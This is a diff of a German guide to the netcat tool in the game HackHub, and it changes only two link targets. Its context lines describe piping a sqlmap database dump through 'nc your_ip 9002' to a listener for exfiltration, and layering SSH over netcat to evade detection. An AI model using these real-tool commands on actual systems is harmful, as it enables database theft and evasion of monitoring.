@@ -32,7 +32,7 @@ Im Hintergrund spiegelt das In-Game-netcat-Binary das echte `nc`-Werkzeug wider.
 | Port-Scan (`-z`) | Prüft offene Ports schnell | Recon vor dem Angriff auf Missionsziele |
 | Dateiübertragung | Sendet/empfängt Roh-Bytes | Log-Exfiltration und Payload-Staging |
 
-Wenn du komplett neu im Toolkit bist, lies zuerst den umfassenderen [HackHub Tools Guide für neue Spieler](/en/tools/HackHub-Beginner-Toolkit/), um zu sehen, wo netcat in der größeren Ausrüstungsphilosophie sitzt, bevor du dich in die unten stehenden Befehlsdetails stürzt.
+Wenn du komplett neu im Toolkit bist, lies zuerst den umfassenderen [HackHub Tools Guide für neue Spieler](/en/tools/), um zu sehen, wo netcat in der größeren Ausrüstungsphilosophie sitzt, bevor du dich in die unten stehenden Befehlsdetails stürzt.
 
 ## Grundlegende Netcat-Befehle für HackHub-Spieler
 
@@ -99,7 +99,7 @@ Die zuverlässigste Kombination ist **netcat plus nmap**. Nutze nmap zur Service
 
 Das mentale Modell für fortgeschrittene Verkettung ist, netcat als **Transportschicht** zwischen zwei übergeordneten Tools zu behandeln. Beispielsweise kannst du die Ausgabe eines SQL-Injection-Tools direkt in netcat pipen mit `sqlmap -u target --batch --dump | nc your_ip 9002`, wodurch die komplette Datenbank-Exfiltration über eine einzige netcat-Sitzung gestreamt wird. Der empfangende Listener fängt den Dump ab und schreibt ihn mit `nc -lvp 9002 > db.sql` auf die Festplatte.
 
-Für Bypass-Firewall-Missionen ist die kanonische Kette **netcat plus SSH-Tunneling**, wobei netcat den ersten Fußpunkt aufbaut und SSH danach einen stabilen verschlüsselten Kanal aufrechterhält. Viele Spieler berichten, dass die HackHub-Detection-KI die rohe netcat-Verbindung genau beobachtet, daher senkt das Übereinanderlegen von SSH die Detection-Rate merklich. Die Kombination wird in unserem [HackHub Advanced Reverse Shell Walkthrough](/en/tools/HackHub-Reverse-Shell-Walkthrough/) ausführlicher behandelt, der gut zu den oben beschriebenen Listener-Mustern passt.
+Für Bypass-Firewall-Missionen ist die kanonische Kette **netcat plus SSH-Tunneling**, wobei netcat den ersten Fußpunkt aufbaut und SSH danach einen stabilen verschlüsselten Kanal aufrechterhält. Viele Spieler berichten, dass die HackHub-Detection-KI die rohe netcat-Verbindung genau beobachtet, daher senkt das Übereinanderlegen von SSH die Detection-Rate merklich. Die Kombination wird in unserem [HackHub Advanced Reverse Shell Walkthrough](/en/tools/) ausführlicher behandelt, der gut zu den oben beschriebenen Listener-Mustern passt.
 
 ### Stealth-Modus und Detection-Vermeidung
 
